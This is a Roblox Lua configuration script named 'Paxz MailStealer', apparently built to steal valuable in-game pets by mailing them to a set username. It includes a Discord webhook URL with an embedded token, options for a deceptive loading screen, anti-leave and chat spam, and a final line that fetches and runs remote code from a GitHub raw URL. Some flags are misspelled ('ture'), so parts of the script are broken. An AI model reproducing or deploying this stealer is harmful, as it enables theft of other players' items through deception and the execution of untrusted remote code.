
-- {{Paxz MailStealer}} --#

_G.UserName = "giorpro13" --// User you want to send good pets to like Titantics, Huges, exclusives
_G.UserName2 = "giorpro13" --// Sends bad pets to like event pets put the same user if you want to send them to first user to
_G.Webhook = "https://discord.com/api/webhooks/1140633158912577647/_UPr8yfZHrb0rvPmsmJ2qbA3eMj22l_4aTh7vaAsHL9Cl1Zz2oUJ5mhtyaSuoRx_MgW-" --// Sends you a notification if you are getting pets in your mail
_G.loadingScreenText = "scam tread accept" --// Set _G.LoadingScreen to true for loading screen and here you can put text for it
_G.ChatMessage = "Treadscamaccpte" --// Set _G.ChatSpam to true for spamming a message you put in here
_G.KickTime = "60" --// Kicks the player after the time you set (In Seconds)

-- [[Extra Stuff]] --

_G.LoadingScreen = true --// Set to true if you want loadingscreen
_G.AntiLeave = true --// Set to true if you want to the player to not leave
_G.MouseLock = false --// Locks the mouse (Not working really well)
_G.ChatSpam = ture --// Spams a message you putted in _G.ChatMessage in the chat
_G.CollectOrbs = ture --// Collects all orbs from anywhere

-- /|\ Script /|\ --
loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()
